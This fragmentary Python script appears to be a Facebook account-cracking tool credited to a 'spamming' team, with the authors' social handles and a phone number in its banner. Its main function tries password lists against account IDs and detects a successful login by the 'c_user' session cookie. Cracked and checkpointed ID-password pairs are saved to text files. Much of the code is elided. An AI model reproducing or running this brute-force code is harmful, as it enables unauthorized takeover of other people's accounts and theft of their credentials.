...
→   Facebook   :  MD SABBIR 
→   Github     :  SABBIR6T9
→Scrift  Owner :Tools Make By It'z Jisan Xhowdhury 
→Team : TEAM CRAZY SPMMING 
→ Wathsapp :+8801776243715
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://facebook.com/groups/783235763132564/');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mSABBIR\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[SABBIR-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/SABBIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[SABBIR-OK] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[SABBIR-CP] '+cid+' | '+ps+'\33[0;97m')
				open('SABBIR-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
